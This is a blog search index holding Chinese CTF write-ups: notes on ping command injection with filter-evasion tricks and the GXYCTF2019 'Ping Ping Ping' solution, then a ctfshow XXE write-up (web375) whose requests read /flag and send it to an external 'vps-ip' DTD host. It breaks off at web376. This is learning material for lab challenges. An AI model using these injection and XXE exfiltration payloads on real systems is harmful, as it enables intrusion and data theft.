<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Ping命令学习记录</title>
    <url>/2024/03/09/Ping%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Ping命令"><a href="#Ping命令" class="headerlink" title="Ping命令"></a>Ping命令</h1><h2 id="题目样式"><a href="#题目样式" class="headerlink" title="题目样式"></a>题目样式</h2><p>看到ping或者ping命令却没有waf时就要想到命令注入。</p>
<h2 id="具体注入方法"><a href="#具体注入方法" class="headerlink" title="具体注入方法"></a>具体注入方法</h2><p>看到ping命令就可以利用截断来执行新的命令。</p>
<span id="more"></span>

<p>首先测试所有的截断符号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$</span><br><span class="line">;</span><br><span class="line">|</span><br><span class="line">-</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">反引号</span><br><span class="line">||</span><br><span class="line">&amp;&amp;</span><br><span class="line">&amp;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>

<p><code>%0a</code>可以当作空格来用；<br>利用截断符号配合普通命令简单问题基本就出来；<br>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;cat /home/flag.txt</span><br></pre></td></tr></table></figure>

<p>简单的flag就出来了，也可以配合其他的进行。</p>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="分号用法"><a href="#分号用法" class="headerlink" title=";分号用法"></a><code>;</code>分号用法</h3><p>方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 ; command2</span><br></pre></td></tr></table></figure>

<p>用<code>;</code>号隔开每个命令， 每个命令按照从左到右的<strong>顺序</strong>执行， 彼此之间不关心是否失败， 所有命令都会执行。</p>
<h3 id="管道符用法"><a href="#管道符用法" class="headerlink" title="| 管道符用法"></a><code>| </code>管道符用法</h3><p>上一条命令的输出，作为下一条命令参数。</p>
<p>CTF里面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 | ls</span><br></pre></td></tr></table></figure>

<p>只执行ls不执行前面的<br>方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 | command</span><br></pre></td></tr></table></figure>

<p>Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。<br>连续使用管道意味着第一个命令的输出会作为第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。</p>
<p>利用一个管道：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa|grep licq</span><br></pre></td></tr></table></figure>

<p>这条命令使用一个管道符“|”建立了一个管道。管道将<code>rpm -qa</code>命令的输出（包括系统中所有安装的RPM包）作为<code>grep</code>命令的输入，从而列出带有<code>licq</code>字符的RPM包来。q表示查询query，a表示all。</p>
<p>利用多个管道：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash | wc -l</span><br></pre></td></tr></table></figure>

<p>这条命令使用了两个管道，利用第一个管道将cat命令（显示passwd文件的内容）的输出送给grep命令，grep命令找出含有“&#x2F;bin &#x2F;bash”的所有行；第二个管道将grep的输出送给wc命令，wc命令统计出输入中的行数。这个命令的功能在于找出系统中有多少个用户使用bash。</p>
<h3 id="符号用法"><a href="#符号用法" class="headerlink" title="&amp;符号用法"></a><code>&amp;</code>符号用法</h3><p>ctf中用法 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp; ls</span><br></pre></td></tr></table></figure>

<p>先执行<code>ls</code>后执行<code>ping</code></p>
<p><code>&amp;</code>放在启动参数后面表示设置此进程为后台进程</p>
<p>方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp; command2</span><br></pre></td></tr></table></figure>

<p>默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作。<br>对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个<code>&amp;</code>实现这个目的。</p>
<h3 id="符号用法（与）"><a href="#符号用法（与）" class="headerlink" title="&amp;&amp;符号用法（与）"></a><code>&amp;&amp;</code>符号用法（与）</h3><p>ctf中用法 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp;&amp; ls</span><br></pre></td></tr></table></figure>

<p><code>ping</code> 命令正确才执行 <code>ls</code> 要是 <code>ping 1 &amp;&amp; ls ls</code> 就不会执行</p>
<p><code>shell</code> 在执行某个命令的时候，会返回一个返回值，该返回值保存在 <code>shell</code> 变量 <code>$?</code> 中。</p>
<p>当 <code>$? == 0</code> 时，表示执行成功；<br>当 <code>$? == 1</code> 时（非0的数，返回值在0-255间），表示执行失败。</p>
<p>有时候，下一条命令依赖前一条命令是否执行成功。</p>
<p>如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。</p>
<p>shell 提供了 <code>&amp;&amp;</code> 和 <code>||</code> 来实现命令执行控制的功能，shell 将根据 <code>&amp;&amp;</code> 或 <code>||</code> 前面命令的返回值来控制其后面命令的执行。</p>
<p>语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 …]</span><br></pre></td></tr></table></figure>

<p>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</p>
<p>只有在 &amp;&amp; 左边的命令返回真（命令返回值 <code>$? == 0</code>），<code>&amp;&amp;</code> 右边的命令才会被执行。<br>只要有一个命令返回假（命令返回值 <code>$? == 1</code>），后面的命令就不会被执行。</p>
<h3 id="符号用法（或）"><a href="#符号用法（或）" class="headerlink" title="||符号用法（或）"></a><code>||</code>符号用法（或）</h3><p>和<code>&amp;&amp;</code>相反，左边为假才执行命令二</p>
<p>语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 || command2 [|| command3 …]</span><br></pre></td></tr></table></figure>


<p>命令之间使用 || 连接，实现逻辑或的功能。</p>
<p>只有在 || 左边的命令返回假（命令返回值 $? &#x3D;&#x3D; 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</p>
<p>只要有一个命令返回真（命令返回值 $? &#x3D;&#x3D; 0），后面的命令就不会被执行。直到返回真的地方停止执行。</p>
<p>举例，ping命令判断存活主机，注意 &amp;&gt;要连起来写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping -c 1 -w 1 192.168.1.1 &amp;&gt; /dev/null &amp;&amp; result=0 ||result=1    if [ &quot;$result&quot; == 0 ];then    echo &quot;192.168.1.1 is UP!&quot;     else    echo &quot;192.168.2.1 is DOWN!&quot;   fi</span><br></pre></td></tr></table></figure>

<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>linux下绕过空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure>

<p>\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br></pre></td></tr></table></figure>

<h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p><code>???</code>在linux里面可以进行代替字母</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/c?t flag.txt</span><br></pre></td></tr></table></figure>

<p><code>*</code>在linux里面可以进行模糊匹配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag.* *</span><br></pre></td></tr></table></figure>

<p>进行模糊匹配php</p>
<h3 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤<code>cat</code></h3><p><code>cat</code>：由第一行开始显示内容，并将所有内容输出</p>
<p><code>tac</code>：从最后一行倒序显示内容，并将所有内容输出</p>
<p><code>more</code>：根据窗口大小，一页一页的现实文件内容</p>
<p><code>less</code>和<code>more</code>类似，但其优点可以往前翻页，而且进行可以搜索字符</p>
<p><code>head</code>：只显示头几行</p>
<p><code>tail</code>：只显示最后几行</p>
<p><code>nl</code>：类似于cat -n，显示时输出行号</p>
<p><code>tailf</code>：类似于tail -f</p>
<p><code>sort%20/flag</code> 读文件</p>
<p><code>dir</code> 来查看当前目录文件</p>
<p>也可以<code>c\at</code></p>
<h3 id="Linux花式读取文件内容"><a href="#Linux花式读取文件内容" class="headerlink" title="Linux花式读取文件内容"></a>Linux花式读取文件内容</h3><p>ps:目标是获取flag.txt的内容</p>
<h4 id="static-sh读取文件"><a href="#static-sh读取文件" class="headerlink" title="static-sh读取文件"></a><code>static-sh</code>读取文件</h4><p><code>static-sh ./flag.txt</code>等同于<code>/???/??????-?? ./flag.txt</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">static-sh ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br><span class="line"><span class="comment"># 等同于</span></span><br><span class="line">/<span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>-<span class="string">??</span> ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>

<h4 id="paste读取文件"><a href="#paste读取文件" class="headerlink" title="paste读取文件"></a><code>paste</code>读取文件</h4><p><code>paste ./flag.txt /etc/passwd</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">paste ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">flag&#123;this_is_a_test&#125;    <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">        <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line">/<span class="regexp">/省略</span></span><br></pre></td></tr></table></figure>

<h4 id="diff读取文件"><a href="#diff读取文件" class="headerlink" title="diff读取文件"></a><code>diff</code>读取文件</h4><p><code>diff ./flag.txt /etc/passwd</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">diff ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">1c1,<span class="number">45</span></span><br><span class="line">&lt; flag&#123;this_is_a_test&#125;</span><br><span class="line">\ <span class="title class_">No</span> newline at <span class="keyword">end</span> of file</span><br><span class="line">---</span><br><span class="line">&gt; <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">&gt; <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br></pre></td></tr></table></figure>

<h4 id="od读取文件"><a href="#od读取文件" class="headerlink" title="od读取文件"></a><code>od</code>读取文件</h4><p><code>od -a ./flag.txt</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">od -<span class="selector-tag">a</span> ./flag<span class="selector-class">.txt</span></span><br><span class="line">#输出结果：</span><br><span class="line"><span class="number">0000000</span>   f   l   <span class="selector-tag">a</span>   g   &#123;   t   h   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">a</span>   _   t</span><br><span class="line"><span class="number">0000020</span>   e   s   t   &#125;</span><br><span class="line"><span class="number">0000024</span></span><br></pre></td></tr></table></figure>

<h4 id="bzmore读取文件"><a href="#bzmore读取文件" class="headerlink" title="bzmore读取文件"></a><code>bzmore</code>读取文件</h4><p><code>bzmore ./flag.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bzmore ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------</span><br><span class="line">flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bzless读取文件"><a href="#bzless读取文件" class="headerlink" title="bzless读取文件"></a><code>bzless</code>读取文件</h4><p><code>bzless ./flag.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `bzless ./flag.txt`</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------ flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>

<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> YWJjZGU=|base64 -d </span><br><span class="line">    <span class="comment">//打印出来abcde</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|bash </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|sh </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>

<h4 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">63617420666</span>c61672e706870 | xxd -r -p|bash <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>

<h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(printf “\<span class="number">154</span>\<span class="number">163</span>”) </span><br><span class="line">    <span class="comment">//ls</span></span><br><span class="line">$(printf “\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70”) </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤;"></a>过滤<code>;</code></h3><h2 id="例题及详解"><a href="#例题及详解" class="headerlink" title="例题及详解"></a>例题及详解</h2><p>[GXYCTF2019]Ping Ping Ping</p>
<p><img src="https://s2.loli.net/2023/11/20/mJixQ7jw4ukMNZn.png" alt="image-20231103224815525"></p>
<p>打开靶机，发现提示用GET方法进行Ping命令注入</p>
<p>构造<code>?ip=127.0.0.1;ls</code></p>
<p><img src="https://s2.loli.net/2023/11/20/O9nWgscwGiC2Ldp.png" alt="image-20231103224922092"></p>
<p>发现两个php文件</p>
<p>构造<code>?ip=127.0.0.1;cat index.php</code>（一般题目不会直接让你出flag，估计里面是各种过滤）</p>
<p><img src="https://s2.loli.net/2023/11/20/Z9PV3Ws8LJag6Kc.png" alt="image-20231103225231785"></p>
<p>发现空格被过滤，用<code>$IFS$1</code>绕过，但是无回显</p>
<p><img src="https://s2.loli.net/2023/11/20/uHCFWkieYcdxE4r.png" alt="image-20231103225717344"></p>
<p>总结：过滤的特殊字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure>

<p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br></pre></td></tr></table></figure>

<p>但仔细观察源码发现有一个$a变量可以覆盖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=f;cat$IFS$1$alag.php    过滤</span><br><span class="line">?ip=127.0.0.1;a=l;cat$IFS$1f$aag.php	没flag</span><br><span class="line">?ip=127.0.0.1;a=a;cat$IFS$1fl$ag.php  	过滤</span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php	有flag</span><br><span class="line">?ip=127.0.0.1;a=fl;b=ag;cat$IFS$1$a$b.php 过滤</span><br><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php 有flag</span><br></pre></td></tr></table></figure>

<p>变量替换顺序，效果也不一样</p>
<h3 id="简单变量替换，用-a覆盖拼接flag"><a href="#简单变量替换，用-a覆盖拼接flag" class="headerlink" title="简单变量替换，用$a覆盖拼接flag"></a>简单变量替换，用$a覆盖拼接flag</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br><span class="line">查看源码</span><br></pre></td></tr></table></figure>

<h3 id="变量ab互换传递，绕过字符串匹配，实现拼接"><a href="#变量ab互换传递，绕过字符串匹配，实现拼接" class="headerlink" title="变量ab互换传递，绕过字符串匹配，实现拼接"></a>变量ab互换传递，绕过字符串匹配，实现拼接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</span><br></pre></td></tr></table></figure>

<h3 id="被过滤的bash，用管道-sh替换"><a href="#被过滤的bash，用管道-sh替换" class="headerlink" title="被过滤的bash，用管道+sh替换"></a>被过滤的bash，用管道+sh替换</h3><p><code>cat flag.php</code>用base64加密来绕过正则匹配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br></pre></td></tr></table></figure>

<p>过滤了flag、bash，但sh没过滤，linux下可用sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>

<p><code>|sh</code> 就是执行前面的echo脚本</p>
<h3 id="类似题的大概思路"><a href="#类似题的大概思路" class="headerlink" title="类似题的大概思路"></a>类似题的大概思路</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fl*  用*匹配任意 </span><br><span class="line">cat fla* 用*匹配任意</span><br><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl&#x27;&#x27;ag.php        两个单引号绕过</span><br><span class="line">echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash      </span><br><span class="line">//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       </span><br><span class="line">//hex编码绕过(引号可以去掉)</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | sh     </span><br><span class="line">//sh的效果和bash一样</span><br><span class="line"></span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat $a$b          变量替换</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br></pre></td></tr></table></figure>

<p>通配符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">*       <span class="comment">#匹配全部字符，通配符</span></span><br><span class="line">?       <span class="comment">#任意一个字符，通配符</span></span><br><span class="line">[]      <span class="comment">#表示一个范围（正则，通配符）</span></span><br><span class="line">&#123;&#125;      <span class="comment">#产生一个序列（通配符）</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/20/2UfKa9yFiozxOg8.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>Ping</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/03/27/ctfshow%20XEE%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h1><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>与上题的区别是多了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> </p>
<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>不要不就好了？web374 的做法也没有加 <code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>。那就和 web374 做法一致就行</p>
<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后加个换行符，发包内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml </span><br><span class="line"> version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>成功接收到 flag</p>
<p><img src="https://s2.loli.net/2024/03/27/6jUB9ZCleKzR1FH.png" alt="image-20240327172210794"></p>
<h2 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后再加个空格，发包内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>成功接收到 flag</p>
<p><img src="https://s2.loli.net/2024/03/27/Lb2ykmlj4vscCDg.png" alt="image-20240327173015025"></p>
<h1 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h1><p>先看源码：</p>
